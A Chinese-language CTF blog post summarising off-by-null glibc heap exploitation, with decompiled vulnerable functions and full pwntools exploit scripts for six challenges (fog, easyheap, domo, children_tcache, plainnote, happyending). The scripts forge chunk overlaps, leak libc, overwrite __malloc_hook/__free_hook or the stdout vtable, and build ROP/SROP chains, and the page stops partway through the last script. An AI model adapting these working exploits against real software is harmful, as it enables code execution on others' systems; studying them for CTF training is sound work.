<!DOCTYPE html>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
  
  <title>off_by_null - 广莫之野</title>
  <meta charset="UTF-8">
  <meta name="description" content>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="/home.png" type="image/png">
  <meta name="description" content="offbynull总结">
<meta name="keywords" content="ctf,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="off_by_null">
<meta property="og:url" content="http://shiroinu.top/2021/04/13/off-by-null/index.html">
<meta property="og:site_name" content="广莫之野">
<meta property="og:description" content="offbynull总结">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2021-04-17T02:02:33.510Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="off_by_null">
<meta name="twitter:description" content="offbynull总结">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
   
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1637381239134">
</head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="tsts">
            <img src="/images/head.png" alt="tsts">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>32</div>
        <div><span>标签</span>3</div>
        <div><span>分类</span>0</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">社交按钮</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  

  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">标签云</h3>
    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/others/" style="font-size: 10px;">others</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
    </div>
    
  </div>

  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
    </div>
  </div>


  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2021 tsts
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
            <img src="/images/back1.png">
        
        <h1>off_by_null</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2021年04月13日</a>
    <a><i class="nexmoefont icon-areachart"></i>3.5k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 20 分钟</a>
    
    
      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
    
  </div>
  <article>
    <p>offbynull总结</p>
<a id="more"></a>
<h1 id="Malloc-consolidate触发条件"><a href="#Malloc-consolidate触发条件" class="headerlink" title="Malloc_consolidate触发条件"></a>Malloc_consolidate触发条件</h1><p><a href="https://ch4r1l3.github.io/2019/01/22/malloc-consolidate%E8%B0%83%E7%94%A8%E6%9D%A1%E4%BB%B6/" target="_blank" rel="noopener">malloc_consolidate调用条件</a></p>
<h1 id="星盟靶场-fog"><a href="#星盟靶场-fog" class="headerlink" title="星盟靶场 fog"></a>星盟靶场 fog</h1><p>在malloc的读content中有offbynull</p>
<pre><code class="c">__int64 __fastcall read_n(void *a1, int a2)
{
  __int64 result; // rax

  LODWORD(result) = read(0, a1, a2);
  *((_BYTE *)a1 + (int)result) = 0;
  return (unsigned int)result;
}</code></pre>
<p>malloc的size限制 &lt; 0x68<br>关键点在于没有setvbuf,因此printf和fopen会申请malloc缓冲区</p>
<pre><code class="c">unsigned __int64 show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  syswrite(&quot;Which one do you want to see?&quot;);
  v1 = readi();
  if ( v1 &lt; 0 || v1 &gt; 15 || !*(_QWORD *)(16LL * v1 + mmap_addr) )
    return syswrite(&quot;Error: Invalid index!\n&quot;);
  printf(&quot;Index : %d\nContent : %s\n&quot;, (unsigned int)v1, *(const char **)(16LL * v1 + mmap_addr)); //printf申请0x400
  return syswrite(&quot;Success!\n&quot;);
}</code></pre>
<pre><code class="c">_BYTE *readflag()
{
  int v0; // eax
  _BYTE *result; // rax
  char v2; // [rsp+Bh] [rbp-5h]
  int v3; // [rsp+Ch] [rbp-4h]

  v3 = 0;
  if ( stream )
  {
    syswrite(&quot;The flag has been opened!&quot;);
    exit(-1);
  }
  syswrite(&quot;It&#39;s a secret!\n&quot;);
  stream = fopen(&quot;./flag&quot;, &quot;rb&quot;); //fopen申请0x230
  if ( !stream )
  {
    syswrite(&quot;A error has occurred when reading flag!&quot;);
    exit(-1);
  }
  setbuf(stream, 0LL);
  while ( 1 )
  {
    v2 = fgetc(stream);
    if ( v2 == -1 )
      break;
    v0 = v3++;
    *((_BYTE *)ptr + v0) ^= v2;
  }
  result = (char *)ptr + v3;
  *result = 0;
  return result;
}</code></pre>
<p>printf申请的chunk size为0x400,可以触发malloc_consolidate<br>fopen申请的size为0x230,不能触发,但是可以通过另一种通过和topchunk合并的方式触发consolidate<br>因此一共可以触发两次合并<br>第一次一次用来构造进入unsortedbin的较大chunk用于被offbynull改小size<br>第二次用来触发伪造size的向前合并造成堆重叠</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>来自影二师傅</p>
<pre><code class="python">from pwn import*
r=process(&#39;./fog&#39;)
context.log_level=&#39;debug&#39;

# libc=ELF(&#39;./libc-2.23.so&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def new(size,content):
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;1&#39;)
    r.recvline()
    r.sendline(str(size))
    r.recvline()
    r.send(content)

def delete(idx):
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;2&#39;)
    r.recvline()
    r.sendline(str(idx))

def edit(idx,content):
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;3&#39;)
    r.recvline()
    r.sendline(str(idx))
    r.recvline()
    r.send(content)

def show(idx):
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;4&#39;)
    r.recvline()
    r.sendline(str(idx))

def read_flag():
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;5&#39;)

def show_flag():
    r.recvuntil(&#39;?\n&#39;)
    r.sendline(&#39;6&#39;)

for i in range(5): new(0x68,&#39;\n&#39;)

for i in range(4): delete(i)

show(4) #printf(%s) -&gt; consolidate

new(0x68,&#39;a&#39;*0x68) #0  #off by null  chunk2 size 150-&gt;100 ; chunk2 ptr + 0x150 ( ptr5 )-&gt; prev size = 0x150; prev_inuse = 0; 
new(0x68,&#39;\n&#39;) #1 0x71
new(0x68,&#39;\n&#39;) #2

delete(4)
delete(1)
gdb.attach(r,&#39;b * $rebase(0x1334)&#39;)
read_flag() #malloc 0x230 &lt;- fopen
show_flag() #free 0x230 -&gt; top chunk -&gt; consolidate

new(0x68,&#39;\n&#39;)
show(2)

libc_base=u64(r.recvuntil(&#39;\x7f&#39;)[-6:]+p16(0))-libc.sym[&#39;__malloc_hook&#39;]-0x68
success(&#39;libc_base: &#39;+hex(libc_base))

malloc_hook=libc_base+libc.sym[&#39;__malloc_hook&#39;]
realloc=libc_base+libc.sym[&#39;realloc&#39;]
one_gadget=libc_base+0x4527a

new(0x68,&#39;\n&#39;)
delete(2)
edit(3,p64(malloc_hook-0x23))

new(0x68,&#39;\n&#39;)
new(0x68,&#39;a&#39;*0xb+p64(one_gadget)+p64(one_gadget))

# gdb.attach(r)

r.recvuntil(&#39;?\n&#39;)
r.sendline(&#39;1&#39;)

r.interactive()</code></pre>
<h1 id="adworld-easyheap"><a href="#adworld-easyheap" class="headerlink" title="adworld-easyheap"></a>adworld-easyheap</h1><p>在add中有offbynull,对malloc的size没有限制,主要研究了一下free的顺序问题,具体见注释</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
from pwn import *
context.log_level = &#39;DEBUG&#39;
context.timeout = 1
# sh = process(&#39;./timu&#39;) #local libc-2.23ubuntu11.2
sh =remote(&#39;111.200.241.244&#39;,56379) #remote : libc-2.23ubuntu11.0
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
def add(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&#39;Size: \n&#39;)
    sh.sendline(str(size))
    sh.recvuntil(&#39;Data: \n&#39;)
    sh.sendline(content)
    sh.recvuntil(&#39;Your choice :\n&#39;)
def delete(index):
    sh.sendline(&#39;2&#39;)
    sh.recvuntil(&#39;Index: \n&#39;)
    sh.sendline(str(index))
    sh.recvuntil(&#39;Your choice :\n&#39;)
def show():
    sh.sendline(&#39;3&#39;)
    # sh.recvuntil(&#39;Your choice :\n&#39;)
# add(0x68,&#39;a&#39;) #0
add(0x1b0,&#39;a&#39;) #0
add(0x68,&#39;a&#39;) #1
add(0x20,&#39;a&#39;) #2
delete(0)
add(0x68,&#39;a&#39; * 0x68) #0
add(0x68,&#39;a&#39;) #3
add(0x68,&#39;a&#39;) #4


delete(1)
delete(3) # 
# fastbin顺序 下面的先进 上面的后进
# 然后consolidate的时候按照fastbin出栈顺序
# 上方的0x71先进unsortedbin 将物理相邻的下一块chunkprevsize修改;且prev_inuse 不出发向前合并 ;相邻的下一块chunk未free 所以也不向后合并
# 然后下方的伪造0x150 prev_size的chunk进unsortedbin,prev_inuse = 0 触发合并; 且可以过unlink的check成功堆重叠

# 2.23unlink中的检测
#if (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, 0))      \
#      malloc_printerr (check_action, &quot;corrupted size vs. prev_size&quot;, P, AV);  \

# 这个unlink的检测和在2.29中的情况不一样
# 2.29中检测是下方伪造过的prevsize和unlink的chunksize进行比较
# if (!prev_inuse(p)) {
#     prevsize = prev_size (p);
#     size += prevsize;
#     p = chunk_at_offset(p, -((long) prevsize));
#     if (__glibc_unlikely (chunksize(p) != prevsize))
#         malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
#     unlink_chunk (av, p);
# }





add(0x400,&#39;a&#39;) #1 consolidate
add(0x68,&#39;a&#39;) #3
show()
sh.recvuntil(&quot;4 : &quot;)
libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - 0x3C4B78 
log.success(&#39;libc_base = &#39; + hex(libc_base))
libc.address = libc_base
malloc_hook = libc.symbols[&#39;__malloc_hook&#39;]
# realloc = libc.symbols[&quot;realloc&quot;]
realloc = libc_base + 0x00000000000846c0
fake_fast = malloc_hook - 0x23
one_gadget = libc_base + 0x4526a
# one_gadget = libc_base + 0x4527a

add(0x68,&#39;a&#39;) #5

delete(4)
delete(0)
delete(5)
add(0x68,p64(fake_fast))
add(0x68,&#39;a&#39;)
add(0x68,&#39;a&#39;)
add(0x68,&#39;a&#39;*0xb  + p64(one_gadget) + p64(realloc + 2))
# add(0x68,&#39;a&#39; *0x13 + p64(one_gadget))
# gdb.attach(sh,&quot;b * $rebase(0xCAE)&quot;)
sh.interactive()</code></pre>
<h1 id="GKCTF2020-domo"><a href="#GKCTF2020-domo" class="headerlink" title="GKCTF2020 domo"></a>GKCTF2020 domo</h1><pre><code class="c">unsigned __int64 __fastcall sub_E6C(const char *a1)
{
  size_t nbytes; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( (unsigned int)((__int64 (__fastcall *)(const char *))check_hook)(a1) == 1 &amp;&amp; chunk_num[0] &lt;= 8 )
  {
    HIDWORD(nbytes) = 0;
    while ( SHIDWORD(nbytes) &lt;= 8 )
    {
      if ( !*((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) )
      {
        puts(&quot;size:&quot;);
        _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);
        if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; (int)nbytes &lt;= 0x120 )
        {
          *((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) = malloc((int)nbytes);
          puts(&quot;content:&quot;);
          read(0, *((void **)&amp;ptr_list + SHIDWORD(nbytes)), (unsigned int)nbytes);
          *(_BYTE *)(*((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) + (int)nbytes) = 0; //必定触发offbynull
          ++chunk_num[0];
        }
        else
        {
          puts(&quot;sobig&quot;);
        }
        return __readfsqword(0x28u) ^ v3;
      }
      ++HIDWORD(nbytes);
    }
  }
  return __readfsqword(0x28u) ^ v3;
}</code></pre>
<p>add中有offbynull,禁用了mallochook和freehook;<br>2.23的stdout可以直接修改vtable指针为想要的地址,直接伪造vtable即可.</p>
<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
sh = process(&#39;./domo&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)
context.log_level = &#39;DEBUG&#39;
context.timeout = 0.5
def add(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&quot;size:\n&quot;)
    sh.sendline(str(size))
    sh.recvuntil(&quot;content:&quot;)
    sh.sendline(content)
    sh.recvuntil(&#39;&gt; &#39;,timeout=0.5)
def add_n(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&quot;size:\n&quot;)
    sh.sendline(str(size))
    sh.recvuntil(&quot;content:&quot;)
    sh.send(content)
    sh.recvuntil(&#39;&gt; &#39;)
def delete(index):
    sh.sendline(&#39;2&#39;)
    sh.recvuntil(&quot;index:\n&quot;)
    sh.sendline(str(index))
    sh.recvuntil(&#39;&gt; &#39;)
def show(index):
    sh.sendline(&#39;3&#39;)
    sh.recvuntil(&#39;index:\n&#39;)
    sh.sendline(str(index))
    data = sh.recvuntil(&#39;\n1: A&#39;,drop=True)
    sh.recvuntil(&#39;&gt; &#39;)
    return data
def edit(addr,content):
    sh.sendline(&#39;4&#39;)
    sh.recvuntil(&quot;addr:\n&quot;)
    sh.sendline(str(addr))
    sh.recvuntil(&#39;num:\n&#39;)
    sh.send(content)
    sh.recvuntil(&#39;&gt; &#39;)
add(0x20,&#39;a&#39;)
add(0x20,&#39;a&#39;)
add(0x20,&#39;a&#39;)
delete(0)
delete(1)
add(0x20,&#39;&#39;)
heap_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x0a
log.info(&quot;heap_base = &quot; + hex(heap_base))
delete(0)
delete(2)


add(0x100,&#39;a&#39;) #0
add(0x60,&#39;a&#39;) #1
delete(0)
add(0x100,&#39;&#39;) #0
libc_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x3C4B0A
one_gadget = libc_base + 0x4527a
libc.address = libc_base
log.success(&quot;libc_base = &quot; + hex(libc_base))
###
add(0x100,&#39;1&#39;) #2
add(0x68,&#39;2&#39;) #3
add(0xF8,&#39;3&#39;) #4
add(0x20,&#39;gap&#39;) #5
###
add(0x110,p64(0)*2 + p64(one_gadget) * 16)
delete(2)
delete(3)
add(0x68,&#39;a&#39;*0x60 + p64(0x70+0x110)) #2 #fake_prev_size ; off by null 0x101 -&gt; 0x100
delete(4)
add(0x100,&#39;a&#39;) #3
add(0x68,&#39;&#39;) #4
delete(2)
delete(1)
delete(4)
stdout = libc.symbols[&#39;_IO_2_1_stdout_&#39;]
fake_vtable = heap_base + 0x4b0
edit(stdout+ 0xd0,&#39;\x71&#39;)
add(0x60,p64(stdout + 0xc8))
add(0x60,&#39;a&#39;)
add(0x60,&#39;a&#39;)
add(0x60,p64(fake_vtable))
# gdb.attach(sh,&#39;b * $rebase(0x12a9)&#39;)

sh.interactive()</code></pre>
<h1 id="hitcon2018-children-tcache"><a href="#hitcon2018-children-tcache" class="headerlink" title="hitcon2018-children_tcache"></a>hitcon2018-children_tcache</h1><p><code>strcpy</code>函数会在字符串后加一字节<code>\x00</code>存在offbynull</p>
<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
from pwn import * 
sh = process(&#39;./children_tcache&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
context.log_level = &quot;DEBUG&quot;
context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
context.arch = &#39;amd64&#39;
def add(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&#39;Size:&#39;)
    sh.sendline(str(size))
    sh.recvuntil(&#39;Data:&#39;)
    sh.send(content)
    sh.recvuntil(&#39;choice: &#39;)
def delete(index):
    sh.sendline(&#39;3&#39;)
    sh.recvuntil(&#39;Index:&#39;)
    sh.sendline(str(index))
    sh.recvuntil(&#39;choice: &#39;,timeout=0.5)
def show(index):
    sh.sendline(&#39;2&#39;)
    sh.recvuntil(&#39;Index:&#39;)
    sh.sendline(str(index))
    data = sh.recvuntil(&#39;\n$$$&#39;,drop=True)
    sh.recvuntil(&#39;choice: &#39;)
    return data

add(0x480,&#39;1&#39;)
add(0x78,&#39;2&#39;)
add(0x4f8,&#39;3&#39;)
add(0x20,&#39;/bin/sh\x00&#39;)
delete(0)
delete(1)
for i in range(9):
    add(0x78 - i, &#39;A&#39; * (0x78 - i))
    delete(0)
add(0x78,b&#39;B&#39; * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10)) #strcpy 到\x00截断
delete(2)
add(0x480,&#39;1&#39;)
libc_base = u64(show(0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0
libc.address = libc_base
free_hook = libc.symbols[&#39;__free_hook&#39;]
log.success(&#39;libc_base = &#39; + hex(libc_base))
add(0x78,&#39;2&#39;)
delete(0)
delete(2)
add(0x78,p64(free_hook))
add(0x78,&#39;a&#39;)
add(0x78,p64(libc_base + 0x4f322))
delete(3)
# gdb.attach(sh,&#39;b * $rebase(0x1053)&#39;)
sh.interactive()</code></pre>
<h1 id="balsnctf-2019-plainnote"><a href="#balsnctf-2019-plainnote" class="headerlink" title="balsnctf-2019 plainnote"></a>balsnctf-2019 plainnote</h1><p>2.29的offbynull,加了新的检测 伪造要求更高 理论成功率1/16<br>需求最后两字节为0x0000<br>值得注意的是 这题我是在2.31下做的,2.31相比于2.29,tcache增加了对tcache count是否&gt;0的检测<br>即如果tcache count = 0;但是指针有内容(比如指向free_hook) 那么2.29能直接malloc出来 2.31不能.<br>新增检测</p>
<pre><code>    * malloc/malloc.c (tcache_get): Compare tcache-&gt;counts[tc_idx]
    with 0, not tcache-&gt;entries[tc_idx].

    * nscd/connections.c (reqinfo): Initialize SHUTDOWN element only
    once.</code></pre><pre><code class="c">  if (tc_idx &lt; mp_.tcache_bins
      &amp;&amp; tcache
      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)
    {
      return tcache_get (tc_idx);
    }</code></pre>
<p>2.27的代码中</p>
<pre><code class="c">  if (tc_idx &lt; mp_.tcache_bins
      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */
      &amp;&amp; tcache
      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }</code></pre>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
from pwn import * 
sh = process(&#39;./note&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
context.log_level = &quot;DEBUG&quot;
context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
context.arch = &#39;amd64&#39;
def add(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&#39;Size: &#39;)
    sh.sendline(str(size))
    sh.recvuntil(&#39;Content: &#39;)
    sh.send(content)
    sh.recvuntil(&#39;Choice: &#39;)
def delete(index):
    sh.sendline(&#39;2&#39;)
    sh.recvuntil(&#39;Idx: &#39;)
    sh.sendline(str(index))
    sh.recvuntil(&#39;Choice: &#39;)
def show(index):
    sh.sendline(&#39;3&#39;)
    sh.recvuntil(&#39;Idx: &#39;)
    sh.sendline(str(index))
    data = sh.recvuntil(&#39;\n***&#39;,drop=True)
    sh.recvuntil(&#39;Choice: &#39;)
    return data

# Clean Bins 0-63
for i in range(7 + 11):
    add(0x18 , &#39;/bin/sh\x00&#39;)
for i in range(7 + 3):
    add(0x38 , &#39;Clean&#39; + &#39;n&#39;)
for i in range(7 + 9):
    add(0x68 , &#39;Clean&#39; + &#39;n&#39;)
for i in range(7 + 2):
    add(0x78 , &#39;Clean&#39; + &#39;n&#39;)
for i in range(5):
    add(0xC8 , &#39;Clean&#39; + &#39;n&#39;)
for i in range(6):
    add(0xE8 , &#39;Clean&#39; + &#39;n&#39;)

for i in range(7):
    add(0x28,&#39;chunk_&#39; + str(64+i) + &#39;n&#39;)  #64-70

# add(0x18,&#39;gap&#39;) #71
add(0x6560,&#39;gap&#39;) #71

add(0x5e0,&#39;72&#39;) #72 完整的被切割chunk 0x18 + 0x28 * 4 + 0x500

add(0x18,&#39;./flag\x00&#39;) #73
delete(72)
add(0x618,&#39;72&#39;) #72 consolidate 0x5f0 into largebin;
# fd_nextsize和bk_nextsize都指向自己 即0x555555760000 也是后面chunk0的地址
add(0x28,b&#39;a&#39; * 8 + p64(0xe1) + p8(0x90)) #74 
#chunk0 (offset+0x10)为被合并时根据prev_size寻址的fake_chunk e1为fake_size 
# 修改fake_chunk fd为0x90 (原chunk0的fd_nextsize有堆地址) bk不变 0x555555760000

add(0x28,&#39;75&#39;) #1 75
add(0x28,&#39;76&#39;) #2 76
add(0x28,&#39;77&#39;) #3 77
add(0x28,&#39;78&#39;) #4 78


for i in range(7):
    delete(64+i)


delete(75) #1
delete(77) #3
# fastbin 3 -&gt; 1

for i in range(7):
    add(0x28,&#39;i&#39;)

add(0x618,&#39;75&#39;) # consolidate fastbin -&gt; smallbin ; smallbin 1 fd-&gt; 3
# 进入smallbin之后 chunk3的bk指向chunk1 被修改为了堆地址 可以一字节修改为指向fake_chunk (0x0010)
# 用于过unlink的check FD-&gt;bk

add(0x28,b&#39;b&#39; * 8 + p8(0x10)) #chunk3 77 修改chunk3 bk为fake_chunk
add(0x28,&#39;chunk1&#39;)  # 79 被重叠的块


for i in range(7):
    delete(64+i)
delete(78) #4
delete(74) #0
#fastbin 0 -&gt; 4
#修改chunk0的fd为堆地址 用于过unlink的check

for i in range(7):
    add(0x28,&#39;i&#39;)

add(0x28,p8(0x10)) #0 74
# 修改一字节 用于过unlink的check BK-&gt;fd

add(0x28,b&#39;c&#39; * 0x20+p64(0xe0)) #4  78
# 0xe0为伪造的prev_size
# offbynull 修改size 0x501-&gt;0x500

add(0x4f8,&#39;n&#39;) #80
delete(80)
# 构造完成后 free时 size=0x500 即 prev_inuse = 0 向前寻址
# 发现构造的fake_chunk size=0xe1 成功过2.29的check
# 然后fd = 0x555555760090 即chunk3 chunk3的bk经过伪造为fake_chunk
# bk = 0x555555760000 即chunk0 bk-&gt;fd 也经过伪造指向fake chunk 成功过check
add(0x18,&#39;80&#39;)
libc_base = u64(show(79).ljust(8,b&#39;\x00&#39;)) - 0x1EBBE0
log.success(&#39;libc_base = &#39; + hex(libc_base))
libc.address = libc_base
add(0x38,&#39;81&#39;)
delete(18)
delete(81)
heap_base = u64(show(79).ljust(8,b&#39;\x00&#39;)) + 0x6cf0
log.info(&#39;heap_base = &#39; +hex(heap_base))
add(0xe8,&#39;18&#39;)
delete(60)
delete(18)
delete(76)
add(0x28,p64(0) + p64(0x31) + p64(libc.symbols[&#39;__free_hook&#39;]))
add(0xe8,&#39;a&#39;)
rdx_gadget = libc_base + 0x0000000000154930
rdi_ret = libc_base + 0x0000000000026b72
rsi_ret = libc_base + 0x0000000000027529
rdx_r12_ret = libc_base + 0x000000000011c371
ret = libc_base + 0x0000000000025679
syscall = libc_base + 0x0000000000066229
rax_ret = libc_base + 0x000000000004a550
#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 

flag_addr =heap_base + 0x600
buf_addr= heap_base + 0x1000
rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall)
rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;read&#39;])
rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;write&#39;])
add(0x618,rop) #76
rop_addr = heap_base + 0x1260

frame = SigreturnFrame()
frame.rip = ret
frame.rsp = rop_addr

add(0x618,str(frame))
payload = p64(rdx_gadget) + p64(libc.symbols[&#39;__free_hook&#39;] + 0x10) + p64(0) * 4 + p64(libc.symbols[&#39;setcontext&#39;] + 61) + bytes(frame)[0x28:]
log.info(hex(len(payload)))
add(0xe8,payload[:0xe8]) #81



# gdb.attach(sh,&quot;b * $rebase(0xdbf)&quot;)
sh.sendline(&#39;2&#39;)
sh.sendline(&#39;82&#39;)
sh.interactive()</code></pre>
<h1 id="DASCTF2020-MAR-happyending"><a href="#DASCTF2020-MAR-happyending" class="headerlink" title="DASCTF2020-MAR happyending"></a>DASCTF2020-MAR happyending</h1><p>和plainnote基本完全一样,还去掉了seccomp</p>
<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
from pwn import *
context.log_level = &#39;DEBUG&#39;

context.timeout = 1
context.arch = &#39;amd64&#39;
context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
sh = process(&#39;./happyending&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
def add(size,content):
    sh.sendline(&#39;1&#39;)
    sh.recvuntil(&#39;length :\n&#39;)
    sh.sendline(str(size))
    sh.recvuntil(&#39;them!\n&#39;)
    sh.send(content)
    sh.recvuntil(&#39;&gt;\n&#39;)
def delete(index):
